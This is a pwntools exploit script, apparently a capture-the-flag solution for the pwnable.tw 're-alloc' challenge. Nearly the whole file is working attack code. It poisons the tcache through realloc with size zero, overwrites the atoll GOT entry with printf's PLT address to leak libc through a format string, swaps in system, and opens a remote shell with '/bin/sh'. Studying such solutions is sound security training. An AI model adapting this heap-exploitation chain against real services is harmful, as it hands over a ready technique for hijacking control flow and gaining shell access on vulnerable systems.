from pwn import *


context.arch = "amd64"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10106
LOCAL = False
elf = ELF("./re-alloc")
libc = elf.libc

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            b *0x4013f1
            b *0x40155c
            b *0x401632
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
def alloc(idx, size, data):
    sla(b": ", b"1")
    sla(b":", str(idx))
    sla(b":", str(size))
    sla(b":", data)

def realloc(idx, size, data):
    sla(b": ", b"2")
    sla(b":", str(idx))
    sla(b":", str(size))
    out = r(4)
    if b"Data" in out:
        sl(data)
    else:
        return

def free(idx):
    sla(b": ", b"3")
    sla(b":", str(idx))

# First malloc
alloc(0, 0x10, b"A" * 8)
realloc(0, 0, b"")
# Key: modify tcache to atoll got & keep the free state
realloc(0, 0x10, p64(0x404048))
alloc(1, 0x10, b"A" * 8)

realloc(0, 0x20, b"A" * 0x10)
free(0)
realloc(1, 0x20, b"B" * 0x10)
free(1)

# Second malloc
alloc(0, 0x30, b"A" * 8)
realloc(0, 0, b"")
realloc(0, 0x30, p64(0x404048)) 
alloc(1, 0x30, b"A" * 8)

realloc(0, 0x40, b"A" * 0x10)
free(0)
realloc(1, 0x40, b"B" * 0x10)
free(1)

# Attack
alloc(0, 0x30, p64(0x401070)) # printf plt
free("%p-%p+%p")
ru(b"+")
libc.address = int(r(14), 16) - 0x12e009
info("LIBC: " + hex(libc.address))

alloc("", "A"*8+"\0", p64(libc.symbols["system"]))
# Manully alloc
# sla(b": ", b"1")
free("/bin/sh\0")

p.interactive()